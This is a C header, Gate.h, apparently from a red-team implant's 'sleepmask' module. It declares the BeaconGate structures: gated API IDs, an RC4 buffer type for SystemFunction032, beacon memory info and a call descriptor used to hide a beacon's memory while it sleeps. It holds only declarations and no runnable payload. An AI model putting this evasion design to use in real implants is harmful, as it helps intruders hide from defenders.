/* sleepmask/include/Gate.h
 * Sleepmask-local copy of the BeaconGate ABI.
 * MUST stay in sync with src_beacon/include/Gate.h - both sides
 * share the FUNCTION_CALL struct layout across the gate boundary. */

#pragma once
#include <windows.h>

#define GATE_MAX_ARGS  10

/* ========= [ gated API identifiers ] ========= */

typedef enum _GATE_API {
    GATE_API_GENERIC                   = 0x00,
    GATE_API_SLEEP                     = 0x01,
    GATE_API_WAIT_FOR_SINGLE_OBJECT    = 0x02,
    GATE_API_WAIT_FOR_MULTIPLE_OBJECTS = 0x03,
    GATE_API_VIRTUAL_PROTECT           = 0x04,
} GATE_API;

/* USTRING for SystemFunction032 (RC4 encrypt/decrypt) */
#ifndef _USTRING_DEFINED
#define _USTRING_DEFINED
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PVOID  Buffer;
} USTRING;
#endif

/* ========= [ sleep obfuscation runtime config ] ========= */

typedef struct _NAX_SM_CONFIG {
    BYTE  SleepObf;       /* 0=disabled, 1=enabled (WFSO PoC) */
    BYTE  _pad;
} NAX_SM_CONFIG, *PNAX_SM_CONFIG;

/* ========= [ sleepmask info - populated by beacon, read by sleepmask ] ========= */

typedef struct _NAX_SM_INFO {
    PVOID   BeaconBase;
    UINT32  BeaconSize;
    PVOID   SmBase;
    UINT32  SmSize;
    PVOID   CleanTextBuf;
    UINT32  CleanTextSize;
    NAX_SM_CONFIG Config;
    UINT32  ActiveJobCount;
} NAX_SM_INFO, *PNAX_SM_INFO;

/* ========= [ function call descriptor ] ========= */

typedef struct _FUNCTION_CALL {
    PVOID      FunctionPtr;
    UINT32     GateApi;
    UINT32     NumArgs;
    ULONG_PTR  Args[GATE_MAX_ARGS];
    ULONG_PTR  RetValue;
    PVOID      SmInfo;
} FUNCTION_CALL, *PFUNCTION_CALL;

/* ========= [ generic dispatch typedefs ] ========= */

typedef ULONG_PTR (*FN0 )( VOID );
typedef ULONG_PTR (*FN1 )( ULONG_PTR );
typedef ULONG_PTR (*FN2 )( ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN3 )( ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN4 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN5 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN6 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN7 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN8 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN9 )( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR (*FN10)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
